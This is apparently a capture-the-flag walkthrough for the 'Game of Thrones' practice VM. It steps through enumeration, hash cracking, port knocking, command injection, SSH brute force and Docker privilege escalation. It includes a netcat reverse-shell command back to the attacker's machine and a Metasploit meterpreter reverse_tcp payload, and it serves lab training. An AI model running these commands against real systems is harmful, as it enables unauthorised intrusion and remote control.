@@ -1,0 +1,172 @@
+
+Hack the Game of Thrones VM (CTF Challenge)
+
+Hello friends! Today we are going to take another CTF challenge known as Game of Thrones. The credit for making this vm machine goes to “OscarAkaElvis” and it is another capture the flag challenge in which our goal is to get all the flags to complete the challenge. You can download this VM here.
+Let’s Breach!!!
+Let us start form getting to know the IP of VM (Here, I have it at 192.168.1.133 but you will have to find your own)
+netdiscover
+
+Use nmap for port enumeration
+nmap -p- -sV 192.168.1.133
+
+We find that port 80 is running http, so we open the ip in our browser.
+
+We take a look at the source code and find the flag syntax.
+
+Use dirb to enumerate the ports.
+dirb http://192.168.1.133
+
+We find the robots.txt file, we open it and find few directories.
+
+We open the directory /secret-island/ using user-agent Three-eyed-raven
+
+We open it and find a link to a map.
+
+When we open the map we find the location of all the flags.
+
+We open the directory called /direct-access-to-kings-landing/ using user-agent Three-eyed-raven.
+
+We open the directory and take a look at the source code and find what looks like port for port knocking and to user as oberynmartell.
+
+We then find /h/i/d/d/e/n/ directory using dirb and we open it.
+
+We take a look at the source code and find password for oberynmartell.
+
+We use ftp to connect we use the username and password we previously found to login. We get the first flag as soon we login.
+
+We find two files and download through ftp and find a file that gives us the type of hash it uses.
+We save the hash in a file.
+
+Now we use john the ripper to decrypt the file and find the password to be stark
+John –format=dynamic_2008 hash.txt
+
+Now we use mcrypt to decrypt the encrypted file we found in the ftp server.
+mcrypt -d the_wall.txt.nc
+
+We now add the domain winterfell.7kingdoms.ctf to /etc/hosts and open the link found in the file.
+
+We login using the username and password to login, and find a page with two images.
+
+We take a look at the source code, and we find the second flag.
+
+Along with the second flag we also find a hint that it contains something, so we download the file and use strings to take a look inside the file and find a domain name.
+strings stark_shield.jpg
+
+It hints us that TXT record will contain something useful so we use nslookup to check the TXT records.  We had to make some changes to the domain name to make it valid, and we find our 3rd flag.
+nslookup -q=txt Timef0rconqu3rs.7Kingdoms.ctf 192.168.1.133
+
+Now we add the new domain name to /etc/hosts and open the link found in TXT record above.
+
+We use login the username and password we find in the TXT records.
+
+We use the search provided by the site to check for vulnerabilities.
+
+We use the file manager module and it opened a file manager that lets us access few files.
+
+In /home/aryastark folder we find a file called flag.txt
+
+We download the file and open it in our system and find our 4th flag.
+
+Now we got a hint to access a database now we know the server is running postgresql, we connect to it using the username password available in the file we find earlier.
+psql –h 192.168.1.133 –u robinarryn –d mountainandthevale
+
+We find a table called flag, we open it and find a base64 encoded string.
+
+We decode the base64 encode string and find our 5th flag.
+
+Now we check the other tables to check if we miss anything. In one of the tables we find a few names
+Select * from arya_kill_list
+In arya_kill_list we find these names that seems useful.
+
+Searching through the database we find a rot16 encoded string.
+
+We now convert the rot16 encoded flag and find a name of database along with the password. It also gives us a hint to use the username we find in the table above.
+
+After enumerating the username we find that TheRedWomanMelisandre is the username.
+
+Now we check the the table and find a secret flag.
+
+Now we know kingdom of reach is in imap as it was shown in the map, now we use the number we find earlier to port knock.
+knock 192.168.1.133 3487 64535 12345
+
+Now we do a nmap scan to check if any new port opened on the server, we find that port 143 that is running imap opened.
+nmap -p- 192.168.1.133
+
+We use netcat to connect to it, we use the username and password we find in the hint earlier.
+nc 192.168.1.133 143
+
+In the inbox we find our 6th flag, we also get a hint to use port 1337 and a username and password is given to login.
+
+We login into the site and find that it is git site.
+
+After enumerating through the files we find that this site is vulnerable to command injection and a hint to use mysql.
+
+We use netcat to get reverse shell on the site we use “”code to execute our code.
+nc –e /bin/bash 192.168.1.116 1234
+
+Now we setup our listener using netcat as soon as we execute our command we get a reverse shell.
+nc -lvp 1234
+
+On the webpage earlier we find hex encoded string when we decode it we get a location of a file:/home/tyrionlannister/checkpoint.txt, so we open it and find username, password and name of the database we need to look for.
+
+Now we use the information above to find the tables available in the database.
+
+We find the name of the table, it is called iron_throne, we take a look inside the table.
+
+Now we find a morse code when we decode it we find it converts to /etc/mysql/flag, when we try to access it gives that file not found, earlier we find a hint that states we don’t have enough privileges so we try to take a look at our privileges.
+
+We find that we can import files into the database. So first we create a table named Flag.
+
+Now we import the file into our table.
+
+Now when we access it we find our 7th flag. We also get username and password for ssh login.
+
+Now we use this to login through ssh.
+ssh daenerystargaryen@192.168.1.133
+
+Enumerating through the system we find two files called digger.txt and checkpoint.txt, checkpoint.txt contains a hint to login through ssh at ip 172.25.0.2 and use the file digger.txt to login through ssh.
+
+We download digger.txt to our system through ssh.
+scp digger.txt root@192.168.1.116:
+
+We use local tunnelling to bind it to our port 2222.
+ssh daenerystargaryen@192.168.1.133 –L 2222:172.25.0.2:22 –N
+
+Now we use hydra to login through ssh to using username as root and use digger.txt file to brute force.
+We find that for the username root we have password “Dr4g0nGl4ss!”
+
+We use this to login through ssh, we use localhost to connect as we have done ssh local tunnel to connect to trough ssh.
+
+Now we enumerating through the files we find our secret flag. We also get a username and password to login through ssh.
+
+We use metasploit to connect through ssh using this username and password.
+msf > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) > set rhosts 192.168.1.133
+msf auxiliary(scanner/ssh/ssh_login) > set username branstark
+msf auxiliary(scanner/ssh/ssh_login) > set  password Th3_Thr33_Ey3d_Raven
+msf auxiliary(scanner/ssh/ssh_login) > run
+
+After searching for some obvious possibilities to escalate privileges such as executables with the setuid bit set or exploits for the kernel, we noticed that this server is docker based. So we use the docker privilege escalation in metasploit.
+msf > use exploit/linux/local/docker_daemon_privilege_escalation
+msf exploit(linux/local/docker_daemon_privilege_escalation) >  set lhost 192.168.1.116
+msf exploit(linux/local/docker_daemon_privilege_escalation) >  set payload linux/x86/meterpreter/reverse_tcp
+msf exploit(linux/local/docker_daemon_privilege_escalation) >  set session 1
+msf exploit(linux/local/docker_daemon_privilege_escalation) >  run 
+
+Now we get our escalated session, we now check and find that we are root.
+
+Now we enumerate through the files and find password protected zip file called final_battle and a file that tells us how to find the password. It contains a pseudo code that tells us how to create the password using secret flags we found.
+
+Now we have obtained 2 secret flag, searching through the files we find that music file contain a secret flag. In the home page we find 2 music file we use exiftool and find that the mp3 file contains the secret flag.
+exiftool  game_of_thrones.mp3
+
+Now we create a code using the pseudocode as reference in python.
+
+We run the program and find the password.
+
+We use zip to extract the file and use this password.
+7z e final_battle
+
+We find that a file called flag.txt was extracted, we open the file and find our final flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cyber security enthusiast. Contact Here
